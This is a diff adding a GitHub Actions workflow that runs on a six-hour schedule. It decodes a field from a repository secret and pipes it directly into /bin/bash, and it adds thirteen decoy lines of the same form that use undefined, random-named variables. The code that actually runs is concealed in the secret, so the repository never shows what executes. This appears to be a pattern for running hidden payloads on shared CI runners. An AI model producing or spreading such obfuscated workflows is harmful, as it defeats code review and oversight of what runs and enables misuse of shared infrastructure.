@@ -1,0 +1,31 @@
+name: zhaiweixigua
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaiweixigua
+        env:
+          sp04894: ${{ secrets.sp04894 }}
+        run: |
+          echo $sp04894 | jq -r .js83 | /bin/bash
+          echo $rbhqk954 | jq -r .n07123 | /bin/bash
+          echo $xbep58 | jq -r .hj5642 | /bin/bash
+          echo $bgdmf7 | jq -r .awg88 | /bin/bash
+          echo $w85359 | jq -r .zvvx30952 | /bin/bash
+          echo $hfq3 | jq -r .m8729 | /bin/bash
+          echo $wi819 | jq -r .eyxi0738 | /bin/bash
+          echo $qljo561 | jq -r .tgmc515 | /bin/bash
+          echo $gzrtr5751 | jq -r .jsw79 | /bin/bash
+          echo $e8773 | jq -r .mpin92 | /bin/bash
+          echo $slka89 | jq -r .yas6467 | /bin/bash
+          echo $mbi57 | jq -r .lf47 | /bin/bash
+          echo $cnvxc259 | jq -r .qku00935 | /bin/bash
+          echo $v6 | jq -r .u294 | /bin/bash
+
